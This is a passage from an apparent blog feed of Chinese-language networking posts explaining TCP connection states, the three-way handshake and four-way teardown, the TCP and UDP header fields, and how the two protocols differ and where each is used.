id="状态编码"><a href="#状态编码" class="headerlink" title="状态编码"></a>状态编码</h3><p>下表为TCP状态码列表，以<strong>S</strong>指代服务器，<strong>C</strong>指代客户端，<strong>S&amp;C</strong>表示两者，<strong>S&#x2F;C</strong>表示两者之一：[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-#1-1">1]</a></p><ul><li><p>LISTEN S</p><p>服务器等待从任意远程TCP端口的连接请求。侦听状态。</p></li><li><p>SYN-SENT C</p><p>客户在发送连接请求后等待匹配的连接请求。通过connect()函数向服务器发出一个同步（SYNC）信号后进入此状态。</p></li><li><p>SYN-RECEIVED S</p><p>服务器已经收到并发送同步（SYNC）信号之后等待确认（ACK）请求。</p></li><li><p>ESTABLISHED S&amp;C</p><p>服务器与客户的连接已经打开，收到的数据可以发送给用户。数据传输步骤的正常情况。此时连接两端是平等的。这称作全连接。</p></li><li><p>FIN-WAIT-1 S&amp;C</p><p>（服务器或客户）主动关闭端调用close（）函数发出FIN请求包，表示本方的数据发送全部结束，等待TCP连接另一端的ACK确认包或FIN&amp;ACK请求包。</p></li><li><p>FIN-WAIT-2 S&amp;C</p><p>主动关闭端在FIN-WAIT-1状态下收到ACK确认包，进入等待远程TCP的连接终止请求的半关闭状态。这时可以接收数据，但不再发送数据。</p></li><li><p>CLOSE-WAIT S&amp;C</p><p>被动关闭端接到FIN后，就发出ACK以回应FIN请求，并进入等待本地用户的连接终止请求的半关闭状态。这时可以发送数据，但不再接收数据。</p></li><li><p>CLOSING S&amp;C</p><p>在发出FIN后，又收到对方发来的FIN后，进入等待对方对己方的连接终止（FIN）的确认（ACK）的状态。少见。</p></li><li><p>LAST-ACK S&amp;C</p><p>被动关闭端全部数据发送完成之后，向主动关闭端发送FIN，进入等待确认包的状态。</p></li><li><p>TIME-WAIT S&#x2F;C</p><p>主动关闭端接收到FIN后，就发送ACK包，等待足够时间以确保被动关闭端收到了终止请求的确认包。（按照RFC 793，一个连接可以在TIME-WAIT保证最大四分钟，即<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E5%A4%A7%E5%88%86%E6%AE%B5%E5%AF%BF%E5%91%BD">最大分段寿命</a>（maximum segment lifetime）的2倍）</p></li><li><p>CLOSED S&amp;C</p><p>完全没有连接。</p></li></ul><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h4 id="为什么建立连接是三次握手，而关闭连接却是四次挥手呢？"><a href="#为什么建立连接是三次握手，而关闭连接却是四次挥手呢？" class="headerlink" title="为什么建立连接是三次握手，而关闭连接却是四次挥手呢？"></a>为什么建立连接是三次握手，而关闭连接却是四次挥手呢？</h4><p>建立连接时因为服务端在LISTEN状态下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。</p><p>而关闭连接时，当收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据，己方也未必全部数据都发送给对方了，所以己方可以立即close，也可以发送一些数据给对方后，再发送FIN报文给对方来表示同意现在关闭连接，因此，己方ACK和FIN一般都会分开发送。</p><h4 id="为什么TIME-WAIT状态需要经过2MSL-最大报文段生存时间-才能返回到CLOSE状态？"><a href="#为什么TIME-WAIT状态需要经过2MSL-最大报文段生存时间-才能返回到CLOSE状态？" class="headerlink" title="为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？"></a>为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？</h4><ul><li>保证TCP协议的全双工连接能够可靠关闭</li><li>保证这次连接的重复数据段从网络中消失</li></ul><p>首先，如果Client直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致Server没有收到Client最后回复的ACK。那么Server就会在超时之后继续发送FIN，此时由于Client已经CLOSED了，就找不到与重发的FIN对应的连接，最后Server就会收到RST而不是ACK，Server就会以为是连接错误把问题报告给高层。这样的情况虽然不会造成数据丢失，但是却导致TCP协议不符合可靠连接的要求。所以，Client不是直接进入CLOSED，而是要保持TIME_WAIT，当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。</p><p>然后，如果Client直接CLOSED，然后又再向Server发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，如果前一次连接的某些数据仍然滞留在网络中，这些延迟数据在建立新连接之后才到达Server，由于新连接和老连接的端口号是一样的，又因为TCP协议判断不同连接的依据是socket pair，于是，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接还要在TIME_WAIT状态等待2倍MSL，这样可以保证本次连接的所有数据都从网络中消失。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li>维基百科，<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE</a></li><li>RaphetS，<a href="https://www.jianshu.com/p/ef892323e68f">https://www.jianshu.com/p/ef892323e68f</a></li><li>趣谈网络协议，<a href="https://time.geekbang.org/column/article/9141">https://time.geekbang.org/column/article/9141</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输层协议：TCP协议（上）——协议结构、主要特点以及应用场景</title>
    <link href="/2023/01/08/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84%E3%80%81%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <url>/2023/01/08/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84%E3%80%81%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层协议：TCP协议（上）——协议结构、主要特点以及应用场景"><a href="#传输层协议：TCP协议（上）——协议结构、主要特点以及应用场景" class="headerlink" title="传输层协议：TCP协议（上）——协议结构、主要特点以及应用场景"></a>传输层协议：TCP协议（上）——协议结构、主要特点以及应用场景</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>传输控制协议</strong>（英语：<strong>T</strong>ransmission <strong>C</strong>ontrol <strong>P</strong>rotocol，缩写：<strong>TCP</strong>）是一种面向连接的、可靠的、基于<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AF%80%E6%B5%81">字节流</a>的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>通信协议，由<a href="https://zh.wikipedia.org/wiki/IETF">IETF</a>的<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc793">793</a>定义。在简化的计算机网络<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>中，它完成第四层传输层所指定的功能。</p><p>应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，然后TCP把数据流分割成适当长度的报文段（通常受该计算机连接的网络的数据链路层的<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E5%A4%A7%E4%BC%A0%E8%BE%93%E5%8D%95%E5%85%83">最大传输单元</a>（MTU）的限制）。之后TCP把结果包传给IP层，由它来透过网络将包传送给接收端实体的TCP层。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的<a href="https://zh.wikipedia.org/wiki/%E7%A2%BA%E8%AA%8D%E8%A8%8A%E6%81%AF">确认信息</a>（ACK）；如果发送端实体在合理的<a href="https://zh.wikipedia.org/wiki/%E4%BE%86%E5%9B%9E%E9%80%9A%E8%A8%8A%E5%BB%B6%E9%81%B2">往返时延</a>（RTT）内未收到确认，那么对应的数据包就被假设为<a href="https://zh.wikipedia.org/wiki/%E4%B8%A2%E5%8C%85">已丢失</a>并进行重传。TCP用一个<a href="https://zh.wikipedia.org/wiki/%E6%A0%A1%E9%AA%8C%E5%92%8C">校验和</a>函数来检验数据是否有错误，在发送和接收时都要计算校验和。</p><h2 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h2><p><img src="https://s2.loli.net/2023/01/08/fMENdUuWvHXqksY.png" alt="数据包结构"></p><ul><li>来源连接端口（16位长）－识别发送连接端口</li><li>目的连接端口（16位长）－识别接收连接端口</li><li>序列号（seq，32位长）<ul><li>如果含有同步化旗标（SYN），则此为最初的序列号；第一个资料比特的序列码为本序列号加一。</li><li>如果没有同步化旗标（SYN），则此为第一个资料比特的序列码。</li></ul></li><li>确认号（ack，32位长）—期望收到的数据的开始序列号。也即已经收到的数据的字节长度加1。</li><li>资料偏移（4位长）—以4字节为单位计算出的数据段开始地址的偏移值。</li><li>保留（3比特长）—须置0</li><li>标志符（9比特长）<ul><li>NS—ECN-nonce。ECN显式拥塞通知（Explicit Congestion Notification）是对TCP的扩展，定义于 RFC 3540 （2003）。ECN允许拥塞控制的端对端通知而避免丢包。ECN为一项可选功能，如果底层网络设施支持，则可能被启用ECN的两个端点使用。在ECN成功协商的情况下，ECN感知路由器可以在IP头中设置一个标记来代替丢弃数据包，以标明阻塞即将发生。数据包的接收端回应发送端的表示，降低其传输速率，就如同在往常中检测到包丢失那样。</li><li>CWR—Congestion Window Reduced，定义于 RFC 3168（2001）。</li><li>ECE—ECN-Echo有两种意思，取决于SYN标志的值，定义于 RFC 3168（2001）。</li><li>URG—为1表示高优先级数据包，紧急指针字段有效。</li><li>ACK—为1表示确认号字段有效</li><li>PSH—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</li><li>RST—为1表示出现严重差错。可能需要重新创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。</li><li>SYN—为1表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步</li><li>FIN—为1表示发送方没有数据要传输了，要求释放连接。</li></ul></li><li>窗口（WIN，16位长）—表示从确认号开始，本报文的发送方可以接收的字节数，即接收窗口大小。用于流量控制。</li><li>校验和（Checksum，16位长）—对整个的TCP报文段，包括TCP头部和TCP数据，以16位字进行计算所得。这是一个强制性的字段。</li><li>紧急指针（16位长）—本报文段中的紧急数据的最后一个字节的序号。</li><li>选项字段—最多40字节。每个选项的开始是1字节的kind字段，说明选项的类型。<ul><li>0：选项表结束（1字节）</li><li>1：无操作（1字节）用于选项字段之间的字边界对齐。</li><li>2：最大报文段长度（4字节，Maximum Segment Size，MSS）通常在创建连接而设置SYN标志的数据包中指明这个选项，指明本端所能接收的最大长度的报文段。通常将MSS设置为（MTU-40）字节，携带TCP报文段的IP数据报的长度就不会超过MTU（MTU最大长度为1518字节，最短为64字节），从而避免本机发生IP分片。只能出现在同步报文段中，否则将被忽略。</li><li>3：窗口扩大因子（3字节，wscale），取值0-14。用来把TCP的窗口的值左移的位数，使窗口值乘倍。只能出现在同步报文段中，否则将被忽略。这是因为现在的TCP接收数据缓冲区（接收窗口）的长度通常大于65535字节。</li><li>4：sackOK—发送端支持并同意使用SACK选项。</li><li>5：SACK实际工作的选项。</li><li>8：时间戳（10字节，TCP Timestamps Option，TSopt）<ul><li>发送端的时间戳（Timestamp Value field，TSval，4字节）</li><li>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）</li></ul></li><li>19：MD5摘要，将TCP伪首部、校验和为0的TCP首部、TCP数据段、通信双方约定的密钥（可选）计算出<a href="https://zh.wikipedia.org/wiki/MD5">MD5</a>摘要值并附加到该选项中，作为类似对TCP报文的签名。通过 <a href="https://tools.ietf.org/html/rfc2385">RFC 2385</a> 引入，主要用于增强<a href="https://zh.wikipedia.org/wiki/%E8%BE%B9%E7%95%8C%E7%BD%91%E5%85%B3%E5%8D%8F%E8%AE%AE">BGP</a>通信的安全性。</li><li>29：安全摘要，通过 <a href="https://tools.ietf.org/html/rfc5925">RFC 5925</a> 引入，将“MD5摘要”的散列方法更换为<a href="https://zh.wikipedia.org/wiki/SHA%E5%AE%B6%E6%97%8F">SHA散列算法</a>。</li></ul></li></ul><h2 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h2><ul><li><strong>面向连接</strong>，也就是说，应用程序在使用TCP协议之前，必须先建立TCP连接。数据传输完毕以后，必须释放已经建立的TCP的连接。</li><li>提供<strong>可靠交付</strong>的服务。通过TCP连接传输的数据，不丢失、不重复、无差错，并且按需到达。</li><li><strong>面向字节流。</strong>TCP中“<strong>流(Stream)”指的是流入到进程或从进程流出的字节序列</strong>。 </li><li><strong>点对点（一对一）</strong></li><li><strong>TCP首部开销20字节;UDP的首部开销更小，只有8个字节</strong></li><li><strong>TCP是可以拥塞控制</strong>。它意识到包丢弃了或者网络的环境不好了，就会根据情况调整自己的行为，看看是不是发快了，要不要发慢点。</li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p><strong>TCP适合对传输效率要求不高，但准确率要求高的应用场景</strong>，比如万维网(HTTP)、文件传输(FTP)、电子邮件(SMTP)等。</p><p>除外，由于TCP的实现是由操作系统提供，而TCP的悠久历史、系统级别的配置机制，一些特性在特定的网络环境下会成为一种累赘而且无法优化，所以也有一些通过在UDP上重新实现用户层级的类似TCP的面向连接的、可靠的、基于字节流的类传输层协议，来代替TCP，例如<a href="https://zh.wikipedia.org/wiki/QUIC">QUIC</a>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.维基百科：<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输层协议：UDP协议</title>
    <link href="/2023/01/07/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/01/07/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层协议：UDP协议"><a href="#传输层协议：UDP协议" class="headerlink" title="传输层协议：UDP协议"></a>传输层协议：UDP协议</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>用户数据报协议</strong>（英语：<strong>U</strong>ser <strong>D</strong>atagram <strong>P</strong>rotocol，缩写：<strong>UDP</strong>；又称<strong>用户数据包协议</strong>）是一个简单的面向<a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8C%85">数据包</a>的<a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE">通信协议</a>，位于<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>。该协议由<a href="https://zh.wikipedia.org/w/index.php?title=David_P._Reed&action=edit&redlink=1">David P. Reed</a>在1980年设计且在<a href="https://tools.ietf.org/html/rfc768">RFC 768</a>中被规范。典型网络上的众多使用UDP协议的关键应用在一定程度上是相似的。</p><p>是一个与 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/IPv6">IP 协议</a> 一起使用的长期<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol">协议</a>，用于在传输速度和效率比安全性和可靠性更重要的场合下发送数据。</p><h2 id="UDP的报头是怎么样的？"><a href="#UDP的报头是怎么样的？" class="headerlink" title="UDP的报头是怎么样的？"></a>UDP的报头是怎么样的？</h2><p>当我们发送 UDP 包到达目标机器后，发现 MAC 地址匹配，于是就取下来，将剩下的包传给处理 IP 层的代码。把 IP 头取下来，发现目标 IP 匹配，接下来这里面的数据包是给谁呢？</p><p>发送的时候，我知道我发的是一个 UDP 的包，收到的那台机器咋知道的呢？所以在 IP 头里面有个 8 位协议，这里会存放，数据里面到底是 TCP 还是 UDP，当然这里是 UDP。所以，如果我们知道 UDP 头的格式，就能从数据里面，将它解析出来。解析出来以后呢？数据给谁处理呢？</p><p><strong>UDP报头结构如下</strong>：</p><p><img src="https://s2.loli.net/2023/01/07/ZcromS8aTj7Cyqw.png" alt="报头分组结构"></p><p>UDP报头包括4个字段，每个字段占用2个字节（即16个二进制位）。在IPv4中，“来源连接端口”和“校验和”是可选字段（以粉色背景标出）。在IPv6中，只有来源连接端口是可选字段。 各16<a href="https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%85%83">bit</a>的来源端口和目的端口用来标记发送和接受的应用进程。因为UDP不需要应答，所以来源端口是可选的，如果来源端口不用，那么置为零。在目的端口后面是长度固定的以字节为单位的长度域，用来指定UDP数据报包括数据部分的长度，长度最小值为8byte。首部剩下地16bit是用来对首部和数据部分一起做<a href="https://zh.wikipedia.org/wiki/%E6%A0%A1%E9%AA%8C%E5%92%8C">校验和</a>（Checksum）的，这部分是可选的，但在实际应用中一般都使用这一功能。</p><ul><li><p>报文长度</p><p>该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535字节（包括8字节的报头，和65527字节的数据）。实际上通过<a href="https://zh.wikipedia.org/wiki/IPv4">IPv4</a>协议传输时，由于IPv4的头部信息要占用20字节，因此数据长度不可能超过65507字节（65,535 − 8字节UDP报头 − 20字节<a href="https://zh.wikipedia.org/wiki/IPv4#.E9.A6.96.E9.83.A8">IP头部</a>）。在IPv6的<a href="https://zh.wikipedia.org/w/index.php?title=Jumbogram&action=edit&redlink=1">jumbogram</a>中，是有可能传输超过65535字节的UDP数据包的。依据<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc2675">2675</a>，如果这种情况发生，报文长度应被填写为0。</p></li><li><p>校验和</p><p><a href="https://zh.wikipedia.org/wiki/%E6%A0%A1%E9%AA%8C%E5%92%8C">校验和</a>字段可以用于发现头部信息和数据中的传输错误。该字段在IPv4中是可选的，在IPv6中则是强制的。如果不使用校验和，该字段应被填充为全0。</p></li></ul><h2 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h2><ul><li><strong>无连接</strong>，即发送数据之前不需要建立连接(发送数据结束时也没有连接可释放)，减少了开销和发送数据之前的时延</li><li><strong>尽最大努力交付</strong>，即不保证可靠交付，主机不需要维持复杂的连接状态表，例如流媒体，实时多人游戏和IP语音（<a href="https://zh.wikipedia.org/wiki/VoIP">VoIP</a>）是经常使用UDP的应用程序。 在这些特定应用中，丢包通常不是重大问题。如果应用程序需要高度可靠性，则可以使用诸如<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>之类的协议。</li><li><strong>面向报文</strong>，发送方的 UDP 对应用程序交下来的报文，在添加首部后就向下交付 IP 层。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界</li><li>支持<strong>一对一、一对多、多对一和多对多的交互通信</strong></li><li><strong>首部开销小</strong>，只有8个字节，比 TCP 的20个字节的首部要短</li><li>缺乏<a href="https://zh.wikipedia.org/wiki/%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">拥塞控制</a>，所以需要基于网络的机制来减少因失控和高速UDP流量负荷而导致的拥塞崩溃效应。换句话说，因为UDP发送端无法检测拥塞，所以像使用包队列和丢弃技术的路由器之类的网络基础设备会被用于降低UDP过大流量。<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">数据拥塞控制协议</a>（DCCP）设计成通过在诸如流媒体类型的高速率UDP流中增加主机拥塞控制，来减小这个潜在的问题。</li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>许多关键的互联网应用程序使用UDP[<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE#cite_note-kuroseross-2">2]</a>，包括：</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F">域名系统</a>（DNS），其中查询阶段必须快速，并且只包含单个请求，后跟单个回复数据包；</li><li><a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE">动态主机配置协议</a>（DHCP），用于动态分配<a href="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>；</li><li><a href="https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE">简单网络管理协议</a>（SNMP）；</li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE">路由信息协议</a>（RIP）；</li><li><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E6%99%82%E9%96%93%E5%8D%94%E5%AE%9A">网络时间协议</a>（NTP）。</li></ul><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%B2%E6%B5%81%E5%AA%92%E9%AB%94">流媒体</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B7%9A%E4%B8%8A%E9%81%8A%E6%88%B2">在线游戏</a>流量通常使用UDP传输。 实时视频流和音频流应用程序旨在处理偶尔丢失、错误的数据包，因此只会发生质量轻微下降，而避免了重传<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%8C%85">数据包</a>带来的高<a href="https://zh.wikipedia.org/wiki/%E5%BB%B6%E9%81%B2">延迟</a>。 由于TCP和UDP都在同一网络上运行，因此一些企业发现来自这些实时应用程序的UDP流量影响了使用TCP的应用程序的性能，例如<a href="https://zh.wikipedia.org/wiki/%E9%94%80%E5%94%AE">销售</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AE%A1">会计</a>和<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F">数据库系统</a>。 当TCP检测到数据包丢失时，它将限制其数据速率使用率。由于实时和业务应用程序对企业都很重要，因此一些人认为开发<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E8%B4%A8%E9%87%8F">服务质量</a>解决方案至关重要。[<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE#cite_note-3">3]</a></p><p>一些<a href="https://zh.wikipedia.org/wiki/VPN">VPN</a>应用（如<a href="https://zh.wikipedia.org/wiki/OpenVPN">OpenVPN</a>）使用UDP并可以在<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">应用程序</a>级别实现可靠连接和错误检查。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE</a></p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传输层协议：TCP与UDP协议的区别</title>
    <link href="/2023/01/07/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2023/01/07/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层协议：TCP与UDP协议的区别"><a href="#传输层协议：TCP与UDP协议的区别" class="headerlink" title="传输层协议：TCP与UDP协议的区别"></a>传输层协议：TCP与UDP协议的区别</h1><h2 id="TCP和UDP有哪些区别？"><a href="#TCP和UDP有哪些区别？" class="headerlink" title="TCP和UDP有哪些区别？"></a>TCP和UDP有哪些区别？</h2><p>关于TCP与UDP协议两个协议的区别，大部分人会回答，TCP是面向连接的，UDP是面向无连接的。</p><p>什么叫面向连接，什么叫无连接呢？在互通之前，面向连接的协议会先建立连接。例如，TCP会三次握手，而UDP不会。为什么要建立连接呢？你TCP三次握手，我UDP也可以发三个包玩玩，有什么区别吗？</p><p><strong>所谓的建立连接，是为了在客户端和服务端维护连接，而建立一定的数据结构来维护双方交互的状态，用这样的数据结构来保证所谓的面向连接的特性。</strong></p><ul><li><strong>TCP提供可靠交付</strong>。通过TCP连接传输的数据，无差错、不丢失、不重复、并且按序到达。而 <strong>UDP继承了IP包的特性，不可靠，不保证不丢失，不保证按顺序到达。</strong></li><li><strong>TCP是面向字节流的</strong>。发送的时候发的是一个流，没头没尾。IP包可不是一个流，而是一个个的IP包。之所以变成了流，这也是TCP自己的状态维护做的事情。而 <strong>UDP继承了IP的特性，基于数据报的，一个一个地发，一个一个地收。</strong></li><li><strong>TCP是可以拥塞控制</strong>。它意识到包丢弃了或者网络的环境不好了，就会根据情况调整自己的行为，看看是不是发快了，要不要发慢点。 <strong>UDP就不会，应用让我发，我就发，管它洪水滔天，所以udp速度也更快</strong></li><li><strong>TCP只支持单播传输</strong>，每条TCP传输连接只能有两个端点，只能进行点对点的数据传输，不支持多播和广播传输方式。UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 <strong>UDP 提供了单播，多播，广播的功能</strong>。</li><li><strong>TCP首部开销20字节;UDP的首部开销小，只有8个字节</strong></li></ul><p>具体细节可见下表：</p><table><thead><tr><th align="left"></th><th align="left">TCP</th><th>UDP</th></tr></thead><tbody><tr><td align="left">可靠性</td><td align="left">可靠</td><td>不可靠</td></tr><tr><td align="left">连接性</td><td align="left">面向连接</td><td>无连接</td></tr><tr><td align="left">报文</td><td align="left">面向字节流</td><td>面向报文</td></tr><tr><td align="left">资源占用</td><td align="left">首部开销20字节</td><td>UDP的首部开销更小，只有8个字节</td></tr><tr><td align="left">效率</td><td align="left">传输效率低</td><td>传输效率高</td></tr><tr><td align="left">传播方式</td><td align="left">只支持单播</td><td>一对一、一对多、多对一、多对多</td></tr><tr><td align="left">流量控制</td><td align="left">滑动窗口</td><td>无</td></tr><tr><td align="left">拥塞控制</td><td align="left">慢开始、拥塞避免、快重传、快恢复</td><td>无</td></tr><tr><td align="left">传输效率</td><td align="left">慢</td><td>快</td></tr></tbody></table><p>因而 <strong>TCP其实是一个有状态服务</strong>，通俗地讲就是有脑子的，里面精确地记着发送了没有，接收到没有，发送到哪个了，应该接收哪个了，错一点儿都不行。而 <strong>UDP则是无状态服务</strong>。通俗地说是没脑子的，天真无邪的，发出去就发出去了。</p><p>我们可以这样比喻，如果MAC层定义了本地局域网的传输行为，IP层定义了整个网络端到端的传输行为，这两层基本定义了这样的基因：网络传输是以包为单位的，二层叫帧，网络层叫包，传输层叫段。我们笼统地称为包。包单独传输，自行选路，在不同的设备封装解封装，不保证到达。基于这个基因，生下来的孩子UDP完全继承了这些特性，几乎没有自己的思想。</p><h2 id="如何选择TCP还是UDP协议？"><a href="#如何选择TCP还是UDP协议？" class="headerlink" title="如何选择TCP还是UDP协议？"></a>如何选择TCP还是UDP协议？</h2><p><strong>根据两个协议的优点，我们可以在传输层有必要实现可靠传输的情况下用TCP协议；在那些对高速传输和实时性有较高要求的通信或者对准确性要求低的情况下用UDP协议。</strong>TCP 和 UDP 